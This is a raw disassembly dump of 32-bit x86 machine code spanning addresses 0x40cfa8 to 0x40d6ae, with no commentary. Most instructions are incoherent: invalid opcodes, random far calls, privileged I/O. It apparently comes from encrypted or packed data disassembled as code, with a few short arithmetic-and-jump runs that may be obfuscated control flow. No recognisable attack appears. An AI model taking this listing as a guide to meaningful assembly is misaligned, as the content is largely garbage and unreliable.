  40cfa8:	in     eax,0x93
  40cfaa:	push   eax
  40cfab:	push   ebp
  40cfac:	cmp    ebp,esp
  40cfae:	rol    DWORD PTR [esi+0x14],0x73
  40cfb2:	push   edi
  40cfb3:	or     edi,DWORD PTR [eax]
  40cfb5:	stc    
  40cfb6:	iret   
  40cfb7:	out    dx,eax
  40cfb8:	adc    BYTE PTR [eax],0x18
  40cfbb:	aas    
  40cfbc:	shl    DWORD PTR [edi+0x54],1
  40cfbf:	clc    
  40cfc0:	rcl    DWORD PTR [ecx+0x1421f633],cl
  40cfc6:	out    dx,al
  40cfc7:	dec    esi
  40cfc8:	cmp    bh,BYTE PTR [esi-0x2b]
  40cfcb:	add    bh,BYTE PTR [esi]
  40cfcd:	les    ebx,FWORD PTR [edx+0x6d]
  40cfd0:	or     bl,BYTE PTR [edx-0x2959f61d]
  40cfd6:	or     al,0x73
  40cfd8:	cmp    eax,DWORD PTR [edx+edx*4]
  40cfdb:	int    0x5b
  40cfdd:	mov    ebp,0x2234b0ca
  40cfe2:	push   ebx
  40cfe3:	sub    al,0x4c
  40cfe5:	addr16 cmp ecx,edx
  40cfe8:	sahf   
  40cfe9:	jne    0x40cf89
  40cfeb:	pusha  
  40cfec:	xchg   ebp,eax
  40cfed:	and    DWORD PTR [esi-0x72],0x705e31e9
  40cff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cff5:	sbb    esi,ecx
  40cff7:	inc    edx
  40cff8:	retf   
  40cff9:	jge    0x40d03e
  40cffb:	cld    
  40cffc:	xchg   edx,eax
  40cffd:	xchg   ecx,eax
  40cffe:	jne    0x40d07b
  40d000:	jo     0x40d044
  40d002:	out    dx,al
  40d003:	or     eax,0xe8dd04b8
  40d008:	add    bl,bh
  40d00a:	or     BYTE PTR [ebx+0x3f],ch
  40d00d:	ins    BYTE PTR es:[edi],dx
  40d00e:	pop    esi
  40d00f:	retf   0xb036
  40d012:	not    BYTE PTR [ebx]
  40d014:	(bad)  
  40d015:	mov    ds:0xa263291f,al
  40d01a:	gs (bad) 
  40d01c:	mov    esi,0x67f8aa86
  40d021:	std    
  40d022:	ret    0x228c
  40d025:	dec    esp
  40d026:	jne    0x40d052
  40d028:	in     al,0x51
  40d02a:	dec    edx
  40d02b:	ja     0x40d06e
  40d02d:	pop    edx
  40d02e:	fwait
  40d02f:	aas    
  40d030:	xchg   ebx,eax
  40d031:	mov    edi,0xd2bb7f84
  40d036:	cli    
  40d037:	inc    ebx
  40d038:	add    bh,bh
  40d03a:	add    BYTE PTR ss:[ecx+0x104046ce],ch
  40d041:	pop    ebx
  40d042:	pop    edi
  40d043:	outs   dx,DWORD PTR ds:[esi]
  40d044:	inc    eax
  40d045:	pop    esi
  40d046:	fisubr DWORD PTR [esi+0x63]
  40d049:	retf   
  40d04a:	js     0x40d01a
  40d04c:	sub    dl,bh
  40d04e:	in     eax,0x1c
  40d050:	dec    esi
  40d051:	fs retf 
  40d053:	xor    al,0x30
  40d055:	scas   al,BYTE PTR es:[edi]
  40d056:	leave  
  40d057:	sbb    DWORD PTR [ecx+edx*8],eax
  40d05a:	pop    ebx
  40d05b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d05c:	and    bh,BYTE PTR [edx]
  40d05e:	arpl   WORD PTR [edx+0x7d],di
  40d061:	add    ebx,esi
  40d063:	scas   eax,DWORD PTR es:[edi]
  40d064:	mov    DWORD PTR [edi+0x6a],eax
  40d067:	xor    al,0xb7
  40d069:	or     eax,0x6c6d302b
  40d06e:	loopne 0x40d0bb
  40d070:	push   esi
  40d071:	ja     0x40d0e1
  40d073:	icebp  
  40d074:	in     eax,dx
  40d075:	imul   eax,esi,0xb0e4739e
  40d07b:	xor    dl,cl
  40d07d:	mov    WORD PTR [eax],es
  40d07f:	xchg   ebx,eax
  40d080:	jg     0x40d0f1
  40d082:	cmp    DWORD PTR [edx+0x6abd85fa],esi
  40d088:	push   ecx
  40d089:	(bad)  
  40d08a:	(bad)  
  40d08b:	mov    edi,0x36779ce0
  40d090:	aaa    
  40d091:	dec    esi
  40d092:	sbb    DWORD PTR [ecx-0x79],0x13
  40d096:	(bad)  
  40d097:	jae    0x40d08b
  40d099:	cmp    bh,ch
  40d09b:	fld    st(0)
  40d09d:	mov    gs,edi
  40d09f:	stc    
  40d0a0:	cwde   
  40d0a1:	je     0x40d11e
  40d0a3:	scas   al,BYTE PTR es:[edi]
  40d0a4:	lods   al,BYTE PTR ds:[esi]
  40d0a5:	pushf  
  40d0a6:	cvtpi2ps xmm4,QWORD PTR [edi+0x47]
  40d0aa:	enter  0xe863,0x2c
  40d0ae:	test   al,0x26
  40d0b0:	in     al,0x25
  40d0b2:	call   0x7219:0xf43f40d4
  40d0b9:	repnz data16 int 0x9a
  40d0bd:	daa    
  40d0be:	repnz pop ds
  40d0c0:	stc    
  40d0c1:	push   ecx
  40d0c2:	lea    ebp,[eax+0x12]
  40d0c5:	mov    bl,BYTE PTR [eax+0x45]
  40d0c8:	mov    gs,WORD PTR ds:[edi]
  40d0cb:	imul   BYTE PTR [edx+eiz*1+0x5]
  40d0cf:	call   0xa1d1:0xb99ffee2
  40d0d6:	cs mul ebx
  40d0d9:	cmp    cl,bl
  40d0db:	loop   0x40d097
  40d0dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0de:	das    
  40d0df:	outs   dx,BYTE PTR ds:[esi]
  40d0e0:	adc    ch,BYTE PTR ds:0xb3818aa0
  40d0e6:	lahf   
  40d0e7:	sti    
  40d0e8:	mov    eax,ds:0xa73666b3
  40d0ed:	push   0x6c705242
  40d0f2:	xchg   esp,edx
  40d0f4:	aaa    
  40d0f5:	test   al,0x4e
  40d0f7:	sbb    dl,bl
  40d0f9:	inc    eax
  40d0fa:	or     eax,0x50d75834
  40d0ff:	push   0x37
  40d101:	(bad)  
  40d103:	cmp    DWORD PTR [ebx-0x7b],ecx
  40d106:	cmp    al,0xc1
  40d108:	xchg   bl,dl
  40d10a:	daa    
  40d10b:	popa   
  40d10c:	pop    ebp
  40d10d:	sub    DWORD PTR [eax],esi
  40d10f:	adc    DWORD PTR [eax*8-0x1f32be7d],esi
  40d116:	mov    ch,0x20
  40d118:	aam    0xe3
  40d11a:	sub    ecx,DWORD PTR [edx]
  40d11c:	ret    0x29e
  40d11f:	lds    ecx,FWORD PTR [ecx+ebp*4-0x7babb38]
  40d126:	sbb    BYTE PTR [esi],dh
  40d128:	mov    al,0xc1
  40d12a:	xlat   BYTE PTR ds:[ebx]
  40d12b:	aam    0x5b
  40d12d:	test   al,0xb1
  40d12f:	retf   0x1b6a
  40d132:	mov    ecx,0x3281efa4
  40d137:	lea    ebp,[edi]
  40d139:	sub    dh,ah
  40d13b:	fild   DWORD PTR [edx+0x5b]
  40d13e:	stos   BYTE PTR es:[edi],al
  40d13f:	cmp    eax,0x166ebaba
  40d144:	mov    ecx,0x2d7235e1
  40d149:	add    esp,esp
  40d14b:	cmp    ebx,DWORD PTR [ecx]
  40d14d:	cld    
  40d14e:	dec    ebp
  40d14f:	push   0xfbef6f71
  40d154:	xchg   ebp,eax
  40d155:	push   cs
  40d156:	push   eax
  40d157:	inc    edi
  40d158:	jg     0x40d1ba
  40d15a:	mov    esi,0x94f6030f
  40d15f:	lods   al,BYTE PTR ds:[esi]
  40d160:	xchg   DWORD PTR [esp+ebx*8],eax
  40d163:	inc    edx
  40d164:	xchg   edi,eax
  40d165:	sbb    cl,BYTE PTR [eax+eiz*2]
  40d168:	in     eax,dx
  40d169:	mov    ebx,0x5b988f3f
  40d16e:	psrlq  mm5,QWORD PTR [ecx]
  40d171:	mov    dl,0x81
  40d173:	dec    edi
  40d174:	dec    edi
  40d175:	inc    ebx
  40d176:	xor    edi,DWORD PTR [ebx-0x52d335f7]
  40d17c:	sub    cl,bl
  40d17e:	addr16 jne 0x40d1de
  40d181:	sbb    al,0x62
  40d183:	mov    ds:0xa3093eb7,eax
  40d188:	in     al,dx
  40d189:	aad    0x83
  40d18b:	retf   
  40d18c:	cld    
  40d18d:	mov    eax,0xe807821e
  40d192:	cmp    ecx,DWORD PTR [esi-0x6]
  40d195:	shr    edi,0xe4
  40d198:	pop    esi
  40d199:	test   BYTE PTR [ebp-0x38],dl
  40d19c:	dec    edx
  40d19d:	sbb    al,0xc2
  40d19f:	ja     0x40d1a3
  40d1a1:	jnp    0x40d191
  40d1a3:	and    dh,ah
  40d1a5:	mov    dh,0x44
  40d1a7:	sbb    edx,DWORD PTR [edi+0x5153bc94]
  40d1ad:	scas   eax,DWORD PTR es:[edi]
  40d1ae:	sbb    eax,0x1b2e50f8
  40d1b3:	das    
  40d1b4:	hlt    
  40d1b5:	ret    
  40d1b6:	cmp    DWORD PTR [esi],eax
  40d1b8:	into   
  40d1b9:	in     eax,dx
  40d1ba:	out    dx,al
  40d1bb:	ss popf 
  40d1bd:	int    0xf7
  40d1bf:	and    BYTE PTR [ebp-0x46],ah
  40d1c2:	jne    0x40d1d8
  40d1c4:	pusha  
  40d1c5:	push   esp
  40d1c6:	push   edi
  40d1c7:	cld    
  40d1c8:	sub    dh,BYTE PTR [edi+0x6]
  40d1cb:	iret   
  40d1cc:	pop    eax
  40d1cd:	repnz sbb al,0xad
  40d1d0:	mov    fs,WORD PTR [edx-0x78]
  40d1d3:	add    ch,dh
  40d1d5:	dec    edx
  40d1d6:	push   eax
  40d1d7:	call   0x49c5:0xdc9ad4ea
  40d1de:	out    dx,al
  40d1df:	xor    edx,eax
  40d1e1:	add    edx,ecx
  40d1e3:	imul   edx,edi
  40d1e6:	mov    edi,DWORD PTR [ebp-0xc]
  40d1e9:	xor    edi,eax
  40d1eb:	sub    edx,edi
  40d1ed:	mov    edi,DWORD PTR [ebp-0xc]
  40d1f0:	mov    ebx,DWORD PTR [ebp-0x14]
  40d1f3:	xor    edi,eax
  40d1f5:	add    edi,ecx
  40d1f7:	imul   edi,ebx
  40d1fa:	mov    ebx,DWORD PTR [ebp-0x18]
  40d1fd:	jmp    0x40d614
  40d202:	pop    esi
  40d203:	in     al,0x48
  40d205:	add    BYTE PTR [esp+edi*4+0x76],dl
  40d209:	ins    BYTE PTR es:[edi],dx
  40d20a:	xor    edx,DWORD PTR [ecx]
  40d20c:	fcmovb st,st(2)
  40d20e:	mov    al,ds:0xc65bdd9e
  40d213:	call   0x7e7e:0x79707e7e
  40d21a:	shr    ebp,0x6f
  40d21d:	sbb    bh,0xd5
  40d220:	aas    
  40d221:	fild   QWORD PTR [esi+0x1b]
  40d224:	push   eax
  40d225:	and    esi,DWORD PTR [edi]
  40d227:	fimul  WORD PTR [ebx-0x65bf2cfe]
  40d22d:	clc    
  40d22e:	xor    eax,edi
  40d230:	pop    ebp
  40d231:	lahf   
  40d232:	xchg   ebp,eax
  40d233:	jge    0x40d1d9
  40d235:	lods   eax,DWORD PTR ds:[esi]
  40d236:	cmp    al,0x58
  40d238:	adc    BYTE PTR [esi+0x2b],dl
  40d23b:	jg     0x40d24d
  40d23d:	xchg   edx,eax
  40d23e:	sahf   
  40d23f:	ret    0xd36a
  40d242:	es test eax,0xd85de2b3
  40d248:	or     eax,eax
  40d24a:	daa    
  40d24b:	cli    
  40d24c:	fsub   QWORD PTR [esi+0x2f895985]
  40d252:	das    
  40d253:	ret    0x4865
  40d256:	add    cl,0x41
  40d259:	or     ah,BYTE PTR ds:0xe26b44b0
  40d25f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d260:	scas   al,BYTE PTR es:[edi]
  40d261:	jg     0x40d2b4
  40d263:	mov    dl,0x7e
  40d265:	jnp    0x40d295
  40d267:	rcr    DWORD PTR [edx],0xbb
  40d26a:	sbb    DWORD PTR [ecx+0x5e],ebp
  40d26d:	push   edx
  40d26e:	fst    QWORD PTR [esi+0x70]
  40d271:	sbb    ch,BYTE PTR [esi+0x437b0712]
  40d277:	cdq    
  40d278:	dec    ebx
  40d279:	cwde   
  40d27a:	clc    
  40d27b:	out    0x84,eax
  40d27d:	mov    esi,0xe14ee276
  40d282:	fwait
  40d283:	xor    DWORD PTR [edx+ecx*2+0x44edad5f],edi
  40d28a:	push   esp
  40d28b:	jns    0x40d2b4
  40d28d:	ret    0x19db
  40d290:	ror    DWORD PTR [edx-0x138698c1],1
  40d296:	cli    
  40d297:	push   ebx
  40d298:	sbb    esi,ebx
  40d29a:	sub    al,BYTE PTR [esi]
  40d29c:	xor    ch,dh
  40d29e:	dec    ebp
  40d29f:	sbb    al,0x5d
  40d2a1:	push   ebx
  40d2a2:	mov    esi,0xd7c6a262
  40d2a7:	jb     0x40d2e1
  40d2a9:	add    BYTE PTR [ebp+0x90086a8],dl
  40d2af:	call   DWORD PTR [edx]
  40d2b1:	push   eax
  40d2b2:	pop    eax
  40d2b3:	dec    ebx
  40d2b4:	sbb    esp,DWORD PTR [edx]
  40d2b6:	push   esp
  40d2b7:	mov    ebx,0xdd3ebcbc
  40d2bc:	es (bad) 
  40d2be:	fnstenv [edx]
  40d2c0:	jge    0x40d33f
  40d2c2:	xor    al,bh
  40d2c4:	jg     0x40d256
  40d2c6:	lea    eax,[ebp-0x3bec080f]
  40d2cc:	icebp  
  40d2cd:	daa    
  40d2ce:	and    dh,BYTE PTR [ecx]
  40d2d0:	aas    
  40d2d1:	pop    eax
  40d2d2:	adc    al,0xb2
  40d2d4:	and    edx,DWORD PTR [esi*1-0x4eb74b2d]
  40d2db:	iret   
  40d2dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2dd:	sub    ebx,esp
  40d2df:	xchg   BYTE PTR [ebp+0x1],dl
  40d2e2:	out    dx,eax
  40d2e3:	sahf   
  40d2e4:	test   BYTE PTR [ecx],bh
  40d2e6:	setns  BYTE PTR [ebp+0x17]
  40d2ea:	scas   eax,DWORD PTR es:[edi]
  40d2eb:	or     esp,edx
  40d2ed:	test   eax,0x358ffb6a
  40d2f2:	push   esi
  40d2f3:	retf   0xdd8e
  40d2f6:	lods   al,BYTE PTR ds:[esi]
  40d2f7:	dec    edx
  40d2f8:	xchg   edx,eax
  40d2f9:	idiv   DWORD PTR [edi-0x4b]
  40d2fc:	add    al,0x3
  40d2fe:	sub    DWORD PTR [esi],edi
  40d300:	push   eax
  40d301:	dec    edx
  40d302:	pop    esp
  40d303:	aas    
  40d304:	push   esi
  40d305:	jns    0x40d374
  40d307:	pop    edi
  40d308:	pop    edi
  40d309:	xor    ch,BYTE PTR [esi-0x228110fd]
  40d30f:	mov    dh,0xd3
  40d311:	es ja  0x40d324
  40d314:	and    BYTE PTR [ecx+0x7253f24c],cl
  40d31a:	xchg   edx,eax
  40d31b:	add    eax,0xcea28c08
  40d320:	cmp    BYTE PTR [ebx],al
  40d322:	cmp    ecx,DWORD PTR [edi-0x282b5585]
  40d328:	(bad)  
  40d329:	fwait
  40d32a:	iret   
  40d32b:	mov    bl,0x2e
  40d32d:	xchg   edx,eax
  40d32e:	push   cs
  40d32f:	aad    0x4a
  40d331:	mov    ecx,0x9d0fb9a6
  40d336:	sbb    al,0x40
  40d338:	jns    0x40d2e1
  40d33a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d33b:	ror    al,1
  40d33d:	popa   
  40d33e:	je     0x40d308
  40d340:	inc    esi
  40d341:	nop
  40d342:	sub    ebx,DWORD PTR [ebx+0x60]
  40d345:	xchg   ebp,eax
  40d346:	mov    ds:0xb6791e40,al
  40d34b:	cmp    DWORD PTR [ebx],edx
  40d34d:	jg     0x40d334
  40d34f:	retf   
  40d350:	aam    0x36
  40d352:	cld    
  40d353:	cmp    BYTE PTR ds:0x811c37d0,0xef
  40d35a:	inc    eax
  40d35b:	xchg   ebx,eax
  40d35c:	sbb    ch,dh
  40d35e:	test   dh,0x39
  40d361:	or     edi,DWORD PTR [ecx+0x9]
  40d364:	jnp    0x40d37d
  40d366:	(bad)
  40d369:	aaa    
  40d36a:	inc    edi
  40d36b:	push   cs
  40d36c:	xchg   edx,eax
  40d36d:	push   edi
  40d36e:	sbb    al,0xf9
  40d370:	jmp    0x40d39b
  40d372:	inc    ecx
  40d373:	jle    0x40d3b8
  40d375:	daa    
  40d376:	cmp    bl,BYTE PTR [esi+0x1d]
  40d379:	lock or al,0xde
  40d37c:	(bad)  
  40d37d:	fiadd  WORD PTR [ebp-0xe]
  40d380:	mov    ebx,0x31327634
  40d385:	les    ecx,FWORD PTR [esp+edi*2+0xb]
  40d389:	idiv   BYTE PTR [ebp-0x2e]
  40d38c:	lods   al,BYTE PTR ds:[esi]
  40d38d:	sub    ecx,DWORD PTR [eax]
  40d38f:	inc    esp
  40d390:	test   DWORD PTR [eax+0x66],edx
  40d393:	test   ebp,ebx
  40d395:	xchg   ebp,eax
  40d396:	adc    eax,0xa516c98b
  40d39b:	pop    ds
  40d39c:	out    0x59,eax
  40d39e:	(bad)  
  40d39f:	push   edi
  40d3a0:	inc    DWORD PTR [eax]
  40d3a2:	mov    edx,0x76f63072
  40d3a7:	dec    edx
  40d3a8:	cs shl edx,cl
  40d3ab:	push   esp
  40d3ac:	sbb    bl,BYTE PTR [eax+0x36]
  40d3af:	sti    
  40d3b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3b1:	icebp  
  40d3b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3b3:	pop    ss
  40d3b4:	jno    0x40d348
  40d3b6:	add    al,bl
  40d3b8:	xlat   BYTE PTR ds:[ebx]
  40d3b9:	pop    edx
  40d3ba:	adc    eax,0x6747841b
  40d3bf:	or     ch,BYTE PTR [esp+edx*2+0x3f]
  40d3c3:	or     DWORD PTR [ecx],ebp
  40d3c5:	inc    ebx
  40d3c6:	in     eax,dx
  40d3c7:	dec    edx
  40d3c8:	add    eax,0xd9598eec
  40d3cd:	inc    edx
  40d3ce:	stos   DWORD PTR es:[edi],eax
  40d3cf:	and    BYTE PTR [eax-0x45],dl
  40d3d2:	or     esp,DWORD PTR [esi-0x23]
  40d3d5:	cmc    
  40d3d6:	cmp    BYTE PTR [esi],bh
  40d3d8:	std    
  40d3d9:	cmc    
  40d3da:	add    dl,BYTE PTR [edx-0x6bdc8066]
  40d3e0:	add    DWORD PTR [ebp+edx*4+0x23],esi
  40d3e4:	pop    edi
  40d3e5:	in     eax,dx
  40d3e6:	xchg   esi,eax
  40d3e7:	std    
  40d3e8:	icebp  
  40d3e9:	mov    al,0x4a
  40d3eb:	dec    ebx
  40d3ec:	jle    0x40d399
  40d3ee:	mov    dh,0x5b
  40d3f0:	enter  0x7a0,0xc7
  40d3f4:	int    0xa1
  40d3f6:	cmp    BYTE PTR [eax+0x14],cl
  40d3f9:	fcomp  QWORD PTR [edx-0x5e]
  40d3fc:	adc    BYTE PTR [eax-0x80],al
  40d3ff:	dec    ecx
  40d400:	arpl   WORD PTR [edx+ebp*1+0x63c368be],sp
  40d407:	jl     0x40d3c9
  40d409:	ret    
  40d40a:	imul   ebp,DWORD PTR [esi+0x79],0xffffffe0
  40d40e:	arpl   WORD PTR [ebx],di
  40d410:	dec    eax
  40d411:	mov    dl,BYTE PTR [ebx]
  40d413:	push   ss
  40d414:	push   cs
  40d415:	aaa    
  40d416:	jecxz  0x40d406
  40d418:	aam    0x69
  40d41a:	(bad)  
  40d41b:	push   esi
  40d41c:	ds fwait
  40d41e:	fwait
  40d41f:	mov    edx,0x7ce4a7ba
  40d424:	pop    esi
  40d425:	adc    eax,0x527ff9b8
  40d42a:	push   ebp
  40d42b:	cmpps  xmm5,XMMWORD PTR ds:0xc9268bc8,0x49
  40d433:	aam    0x21
  40d435:	stos   BYTE PTR es:[edi],al
  40d436:	(bad)  
  40d438:	push   ss
  40d439:	sub    cl,BYTE PTR [edx+0x650b991d]
  40d43f:	xor    dl,BYTE PTR [esi]
  40d441:	retf   0x9a5d
  40d444:	add    al,BYTE PTR [ebx]
  40d446:	mov    eax,ds:0xc333ccb9
  40d44b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d44c:	bound  eax,QWORD PTR [esi]
  40d44e:	mov    esi,0xfafbc140
  40d453:	cmp    al,0x4f
  40d455:	jl     0x40d4ce
  40d457:	or     DWORD PTR [edi-0x73],0xbcbdca5e
  40d45e:	inc    ecx
  40d45f:	test   BYTE PTR [ecx+0x12],ah
  40d462:	push   edi
  40d463:	ret    
  40d464:	stos   BYTE PTR es:[edi],al
  40d465:	outs   dx,BYTE PTR ds:[esi]
  40d466:	fdivr  st,st(5)
  40d468:	sti    
  40d469:	stos   DWORD PTR es:[edi],eax
  40d46a:	sub    BYTE PTR [edx-0x29006a55],dl
  40d470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d471:	push   edi
  40d472:	cmp    al,0xc8
  40d474:	or     bl,BYTE PTR [ecx-0x3bb95c52]
  40d47a:	dec    eax
  40d47b:	sbb    bl,ch
  40d47d:	jp     0x40d4da
  40d47f:	pop    edi
  40d480:	dec    ebx
  40d481:	mov    ecx,DWORD PTR [edi+eiz*8+0xaf8334f]
  40d488:	xor    cl,BYTE PTR [eax+ebx*2+0x633724c2]
  40d48f:	int3   
  40d490:	das    
  40d491:	fsubr  st,st(0)
  40d493:	push   cs
  40d494:	sub    ebp,ecx
  40d496:	cwde   
  40d497:	iret   
  40d498:	packuswb mm4,mm3
  40d49b:	sti    
  40d49c:	inc    esi
  40d49d:	call   0xeb9d6665
  40d4a2:	jae    0x40d46a
  40d4a4:	push   ebx
  40d4a5:	icebp  
  40d4a6:	int    0xab
  40d4a8:	iret   
  40d4a9:	adc    ah,dh
  40d4ab:	xor    edx,DWORD PTR [esi-0x77]
  40d4ae:	push   0x2c28c04e
  40d4b3:	xchg   esp,eax
  40d4b4:	mov    ebp,0x1a32f281
  40d4b9:	ret    
  40d4ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4bb:	sbb    eax,0xc69d319e
  40d4c0:	sub    DWORD PTR [eax],esp
  40d4c2:	(bad)  
  40d4c3:	dec    esi
  40d4c4:	mov    esp,0xc840c17f
  40d4c9:	mov    edi,0x4cb5c289
  40d4ce:	aas    
  40d4cf:	inc    ebp
  40d4d0:	sti    
  40d4d1:	outs   dx,BYTE PTR ds:[esi]
  40d4d2:	jp     0x40d4e1
  40d4d4:	js     0x40d511
  40d4d6:	push   ebp
  40d4d7:	fcmovnu st,st(4)
  40d4d9:	mov    ecx,0x22b68be0
  40d4de:	retf   
  40d4df:	jecxz  0x40d52c
  40d4e1:	jecxz  0x40d528
  40d4e3:	retf   0x7441
  40d4e6:	mov    ds:0x519114ff,al
  40d4eb:	xchg   ebp,eax
  40d4ec:	pop    es
  40d4ed:	pop    ss
  40d4ee:	into   
  40d4ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4f0:	mov    dl,0x5a
  40d4f2:	int    0xe
  40d4f4:	retf   
  40d4f5:	mov    bl,0x9e
  40d4f7:	sti    
  40d4f8:	(bad)  
  40d4f9:	scas   eax,DWORD PTR es:[edi]
  40d4fa:	mov    dh,0x8c
  40d4fc:	(bad)  
  40d4fd:	das    
  40d4fe:	adc    DWORD PTR [ebp-0x5fb7f4a1],ebx
  40d504:	loope  0x40d50a
  40d506:	cmp    ch,BYTE PTR [di]
  40d509:	add    DWORD PTR [esi+0x28b7a6aa],esp
  40d50f:	pushf  
  40d510:	xor    al,0xcc
  40d512:	outs   dx,BYTE PTR ds:[esi]
  40d513:	inc    ebp
  40d514:	dec    esp
  40d515:	inc    esi
  40d516:	(bad)  
  40d517:	call   0x5d9c:0x29fd5c2a
  40d51e:	inc    edi
  40d51f:	inc    edi
  40d520:	(bad)  
  40d521:	push   0xc142666e
  40d526:	and    al,0xcf
  40d528:	mov    DWORD PTR [eax+0x0],ebp
  40d52b:	sbb    DWORD PTR [edi-0x7a],esp
  40d52e:	jle    0x40d50d
  40d530:	dec    ecx
  40d531:	cmp    BYTE PTR [ecx],ah
  40d533:	mov    ebp,0xf8b6fa93
  40d538:	jge    0x40d55f
  40d53a:	jle    0x40d50c
  40d53c:	mul    bh
  40d53e:	ss sub al,0x9a
  40d541:	mov    al,0x2c
  40d543:	mov    esi,esi
  40d545:	jp     0x40d511
  40d547:	lock mov ch,0xf1
  40d54a:	push   ds
  40d54b:	pop    edx
  40d54c:	cld    
  40d54d:	mov    edx,0xfaf9d219
  40d552:	lods   eax,DWORD PTR ds:[esi]
  40d553:	popf   
  40d554:	jg     0x40d5b0
  40d556:	add    esi,esi
  40d558:	mov    es,WORD PTR [esi]
  40d55a:	dec    edx
  40d55b:	push   ds
  40d55c:	sti    
  40d55d:	mov    bl,0x51
  40d55f:	aam    0x7c
  40d561:	daa    
  40d562:	cdq    
  40d563:	dec    ecx
  40d564:	xchg   DWORD PTR [esi],ebp
  40d566:	push   cs
  40d567:	adc    bh,BYTE PTR [eax-0x50]
  40d56a:	sti    
  40d56b:	mov    bh,0x10
  40d56d:	sub    BYTE PTR [esi-0x1c7ec3ed],cl
  40d573:	mov    al,0x62
  40d575:	dec    ecx
  40d576:	mov    ah,0xe
  40d578:	push   0xca5fc174
  40d57d:	popf   
  40d57e:	jmp    0x2e8:0x8d18383a
  40d585:	or     BYTE PTR [ebp-0x42],ch
  40d588:	idiv   BYTE PTR [ecx-0x1]
  40d58b:	mov    esp,0xc975878c
  40d590:	(bad)  
  40d591:	adc    eax,0xd4520300
  40d596:	sar    BYTE PTR [edx-0x38e7c3f],cl
  40d59c:	adc    bh,BYTE PTR [eax+0x42]
  40d59f:	sbb    BYTE PTR [edx+0x1d4717c0],0xa1
  40d5a6:	popa   
  40d5a7:	mov    bh,0x10
  40d5a9:	test   al,0xe7
  40d5ab:	cs inc edx
  40d5ad:	das    
  40d5ae:	pop    ebx
  40d5af:	push   esp
  40d5b0:	dec    esp
  40d5b1:	outs   dx,DWORD PTR ds:[esi]
  40d5b2:	imul   esi,DWORD PTR [esi+0x397c54c3],0x111bc138
  40d5bc:	xchg   ebx,edx
  40d5be:	sbb    BYTE PTR [edx+0x2c6ae9b5],bl
  40d5c4:	mov    ebp,0xb63c1d97
  40d5c9:	inc    eax
  40d5ca:	mov    dh,0x83
  40d5cc:	lods   al,BYTE PTR ds:[esi]
  40d5cd:	jmp    0xd659240a
  40d5d2:	mov    WORD PTR [ecx-0x6e21f4d8],gs
  40d5d8:	iret   
  40d5d9:	inc    eax
  40d5da:	mov    ah,0xf
  40d5dc:	inc    esi
  40d5dd:	daa    
  40d5de:	mov    dl,0x93
  40d5e0:	cld    
  40d5e1:	scas   al,BYTE PTR es:[edi]
  40d5e2:	jmp    0x6a0d9dc6
  40d5e7:	xor    eax,0xe68307ad
  40d5ec:	(bad)  
  40d5ed:	loop   0x40d592
  40d5ef:	(bad)  
  40d5f0:	push   esi
  40d5f1:	jp     0x40d5a0
  40d5f3:	imul   ecx,DWORD PTR ds:0x26112938,0x6c
  40d5fa:	not    DWORD PTR [edi-0x6a6e72df]
  40d600:	adc    edi,esi
  40d602:	into   
  40d603:	icebp  
  40d604:	imul   ebp,DWORD PTR [esi+0x4797c122],0x5003a5a6
  40d60e:	jmp    0x5e1736f2
  40d613:	loopne 0x40d648
  40d615:	fsubr  DWORD PTR [ebx]
  40d617:	ror    DWORD PTR [ebp+0x72991fbc],1
  40d61d:	xor    al,BYTE PTR [eax]
  40d61f:	cmp    edi,edx
  40d621:	jbe    0x40c529
  40d627:	mov    edx,DWORD PTR [ebp-0xc]
  40d62a:	mov    edi,DWORD PTR [ebp-0x24]
  40d62d:	xor    edx,eax
  40d62f:	add    edx,ecx
  40d631:	imul   edx,edi
  40d634:	mov    edi,DWORD PTR [ebp-0x18]
  40d637:	jmp    0x40da4e
  40d63c:	(bad)  
  40d63d:	pusha  
  40d63e:	jecxz  0x40d614
  40d640:	jge    0x40d697
  40d642:	icebp  
  40d643:	ins    BYTE PTR es:[edi],dx
  40d644:	(bad)  
  40d645:	fwait
  40d646:	mov    edi,0x53073398
  40d64b:	mov    cl,0x38
  40d64d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d64e:	jle    0x40d6ce
  40d650:	jo     0x40d6cb
  40d652:	jle    0x40d6d2
  40d654:	out    dx,al
  40d655:	dec    ecx
  40d656:	lea    ebx,[esi]
  40d658:	adc    esp,eax
  40d65a:	mov    BYTE PTR [edx+eax*4-0x21],ah
  40d65e:	test   edi,ebp
  40d660:	fwait
  40d661:	sbb    BYTE PTR [ebx-0x33],ch
  40d664:	loope  0x40d65b
  40d666:	sbb    DWORD PTR [ebx-0x1b],ecx
  40d669:	mov    ah,0x67
  40d66b:	cmp    eax,0x8ec4af06
  40d670:	pop    edi
  40d671:	aad    0xb5
  40d673:	xchg   ebp,eax
  40d674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d675:	mov    esi,0xef21c7b6
  40d67a:	xchg   ebp,eax
  40d67b:	stos   BYTE PTR es:[edi],al
  40d67c:	ins    DWORD PTR es:[edi],dx
  40d67d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d67e:	push   ebx
  40d67f:	jge    0x40d628
  40d681:	pop    ds
  40d682:	add    edx,DWORD PTR [ebx]
  40d684:	int3   
  40d685:	retf   
  40d686:	mov    eax,0x69580c6f
  40d68b:	and    al,0x97
  40d68d:	cmp    DWORD PTR [edx-0x7c],0xf589332b
  40d694:	int    0x8b
  40d696:	push   ecx
  40d697:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d698:	repnz mov esp,0x7c1b266e
  40d69e:	add    eax,0x78cd3558
  40d6a3:	pop    edi
  40d6a4:	int3   
  40d6a5:	or     al,BYTE PTR [ebx+0x4bed445]
  40d6ab:	into   
  40d6ac:	test   al,0x8f
  40d6ae:	xor    al,ah
